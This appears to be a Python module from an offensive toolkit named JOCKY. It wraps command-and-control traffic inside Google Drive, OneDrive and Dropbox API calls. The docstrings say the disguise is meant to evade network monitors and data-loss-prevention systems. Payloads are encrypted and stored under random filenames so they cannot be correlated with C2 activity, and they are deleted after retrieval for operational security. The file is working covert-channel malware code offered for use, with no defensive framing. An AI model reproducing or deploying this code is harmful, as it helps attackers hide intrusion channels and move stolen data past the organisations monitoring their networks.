"""
JOCKY Cloud API Wrapper — Phase 14
====================================
Wraps C2 traffic as legitimate cloud storage API calls.

Traffic appears as normal Google Drive / OneDrive / Dropbox API usage
to network monitors and DLP systems. The actual C2 payload is encoded
inside the file content or metadata fields of the cloud API request.

Supported backends:
  - Google Drive API v3 (files.create, files.get)
  - Microsoft OneDrive (Graph API)
  - Dropbox API v2

Encoding:
  - Payload is AES-256-CTR encrypted (same key as string encryptor)
  - Encrypted bytes are base64-encoded
  - Stored as file content in the cloud storage API call
  - File name is a random UUID — no correlation to C2 activity

Usage:
    wrapper = CloudAPIWrapper(backend="gdrive", api_key="...")
    upload_id = await wrapper.upload(payload_dict)
    result    = await wrapper.download(upload_id)
    await wrapper.delete(upload_id)
"""

from __future__ import annotations

import asyncio
import base64
import json
import secrets
import uuid
from typing import Any

try:
    import aiohttp
    _AIOHTTP_OK = True
except ImportError:
    _AIOHTTP_OK = False


# ─── Backend configurations ───────────────────────────────────────────────────

BACKEND_CONFIGS: dict[str, dict] = {
    "gdrive": {
        "upload_url":   "https://www.googleapis.com/upload/drive/v3/files",
        "download_url": "https://www.googleapis.com/drive/v3/files/{file_id}?alt=media",
        "delete_url":   "https://www.googleapis.com/drive/v3/files/{file_id}",
        "auth_header":  "Authorization",
        "auth_prefix":  "Bearer ",
        "mime_type":    "application/octet-stream",
    },
    "onedrive": {
        "upload_url":   "https://graph.microsoft.com/v1.0/me/drive/root:/{filename}:/content",
        "download_url": "https://graph.microsoft.com/v1.0/me/drive/items/{file_id}/content",
        "delete_url":   "https://graph.microsoft.com/v1.0/me/drive/items/{file_id}",
        "auth_header":  "Authorization",
        "auth_prefix":  "Bearer ",
        "mime_type":    "application/octet-stream",
    },
    "dropbox": {
        "upload_url":   "https://content.dropboxapi.com/2/files/upload",
        "download_url": "https://content.dropboxapi.com/2/files/download",
        "delete_url":   "https://api.dropboxapi.com/2/files/delete_v2",
        "auth_header":  "Authorization",
        "auth_prefix":  "Bearer ",
        "mime_type":    "application/octet-stream",
    },
}


class CloudAPIWrapper:
    """
    Wraps C2 payload as cloud storage API traffic.

    Parameters
    ----------
    backend : str
        Cloud backend to use (gdrive, onedrive, dropbox).
    api_key : str
        OAuth2 access token for the cloud API.
    encrypt_key : bytes | None
        32-byte AES-256 key for payload encryption.
        If None, a random key is generated (must be shared with receiver).
    """

    def __init__(
        self,
        backend:     str,
        api_key:     str,
        encrypt_key: bytes | None = None,
    ) -> None:
        if backend not in BACKEND_CONFIGS:
            raise ValueError(f"Unknown backend: {backend}. Choose from: {list(BACKEND_CONFIGS)}")

        self.backend     = backend
        self.config      = BACKEND_CONFIGS[backend]
        self.api_key     = api_key
        self.encrypt_key = encrypt_key or secrets.token_bytes(32)
        self._session    = None

    # ─── Public API ───────────────────────────────────────────────────────────

    async def upload(self, payload: dict) -> str:
        """
        Encrypt and upload a payload dict as a cloud file.

        Parameters
        ----------
        payload : dict
            JSON-serialisable C2 payload.

        Returns
        -------
        str
            Cloud file ID (used for download/delete).
        """
        if not _AIOHTTP_OK:
            raise RuntimeError("aiohttp not installed. Run: pip install aiohttp")

        # Encode payload
        raw       = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        encrypted = self._encrypt(raw)
        encoded   = base64.b64encode(encrypted).decode("ascii")

        # Generate a random filename (no C2 correlation)
        filename = f"{uuid.uuid4().hex}.bin"

        session = await self._get_session()
        headers = {
            self.config["auth_header"]: self.config["auth_prefix"] + self.api_key,
            "Content-Type": self.config["mime_type"],
        }

        if self.backend == "gdrive":
            return await self._gdrive_upload(session, headers, filename, encoded)
        elif self.backend == "onedrive":
            return await self._onedrive_upload(session, headers, filename, encoded)
        elif self.backend == "dropbox":
            return await self._dropbox_upload(session, headers, filename, encoded)
        else:
            raise NotImplementedError(f"Upload not implemented for {self.backend}")

    async def download(self, file_id: str) -> dict:
        """
        Download and decrypt a payload from cloud storage.

        Parameters
        ----------
        file_id : str
            Cloud file ID returned by upload().

        Returns
        -------
        dict
            Decrypted payload dict.
        """
        if not _AIOHTTP_OK:
            raise RuntimeError("aiohttp not installed.")

        url     = self.config["download_url"].format(file_id=file_id)
        session = await self._get_session()
        headers = {
            self.config["auth_header"]: self.config["auth_prefix"] + self.api_key,
        }

        async with session.get(url, headers=headers) as resp:
            resp.raise_for_status()
            encoded   = await resp.text()
            encrypted = base64.b64decode(encoded)
            raw       = self._decrypt(encrypted)
            return json.loads(raw.decode("utf-8"))

    async def delete(self, file_id: str) -> bool:
        """Delete a cloud file after retrieval (operational security)."""
        if not _AIOHTTP_OK:
            return False

        url     = self.config["delete_url"].format(file_id=file_id)
        session = await self._get_session()
        headers = {
            self.config["auth_header"]: self.config["auth_prefix"] + self.api_key,
        }

        try:
            async with session.delete(url, headers=headers) as resp:
                return resp.status in (200, 204)
        except Exception:
            return False

    async def close(self) -> None:
        if self._session and _AIOHTTP_OK:
            await self._session.close()
            self._session = None

    # ─── Backend-specific upload implementations ──────────────────────────────

    async def _gdrive_upload(self, session, headers, filename, encoded) -> str:
        """Google Drive multipart upload."""
        metadata = json.dumps({"name": filename}).encode("utf-8")
        boundary = secrets.token_hex(16)
        body = (
            f"--{boundary}\r\n"
            f"Content-Type: application/json\r\n\r\n"
            f"{metadata.decode()}\r\n"
            f"--{boundary}\r\n"
            f"Content-Type: application/octet-stream\r\n\r\n"
            f"{encoded}\r\n"
            f"--{boundary}--"
        ).encode("utf-8")

        headers["Content-Type"] = f"multipart/related; boundary={boundary}"
        url = self.config["upload_url"] + "?uploadType=multipart"

        async with session.post(url, headers=headers, data=body) as resp:
            resp.raise_for_status()
            data = await resp.json()
            return data["id"]

    async def _onedrive_upload(self, session, headers, filename, encoded) -> str:
        """OneDrive simple upload."""
        url = self.config["upload_url"].format(filename=filename)
        async with session.put(url, headers=headers, data=encoded.encode()) as resp:
            resp.raise_for_status()
            data = await resp.json()
            return data["id"]

    async def _dropbox_upload(self, session, headers, filename, encoded) -> str:
        """Dropbox upload."""
        headers["Dropbox-API-Arg"] = json.dumps({
            "path": f"/{filename}",
            "mode": "add",
        })
        async with session.post(
            self.config["upload_url"], headers=headers, data=encoded.encode()
        ) as resp:
            resp.raise_for_status()
            data = await resp.json()
            return data["id"]

    # ─── Encryption ───────────────────────────────────────────────────────────

    def _encrypt(self, data: bytes) -> bytes:
        """AES-256-CTR encrypt. Prepends 16-byte nonce."""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            nonce  = secrets.token_bytes(16)
            cipher = Cipher(algorithms.AES(self.encrypt_key), modes.CTR(nonce),
                            backend=default_backend())
            enc    = cipher.encryptor()
            return nonce + enc.update(data) + enc.finalize()
        except ImportError:
            # Fallback: XOR with key (weak, but functional without cryptography)
            key_cycle = (self.encrypt_key * ((len(data) // 32) + 1))[:len(data)]
            return bytes(a ^ b for a, b in zip(data, key_cycle))

    def _decrypt(self, data: bytes) -> bytes:
        """AES-256-CTR decrypt. Reads 16-byte nonce from prefix."""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            nonce      = data[:16]
            ciphertext = data[16:]
            cipher     = Cipher(algorithms.AES(self.encrypt_key), modes.CTR(nonce),
                                backend=default_backend())
            dec        = cipher.decryptor()
            return dec.update(ciphertext) + dec.finalize()
        except ImportError:
            key_cycle = (self.encrypt_key * ((len(data) // 32) + 1))[:len(data)]
            return bytes(a ^ b for a, b in zip(data, key_cycle))

    # ─── Session management ───────────────────────────────────────────────────

    async def _get_session(self):
        if self._session is None or self._session.closed:
            self._session = aiohttp.ClientSession()
        return self._session

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        await self.close()
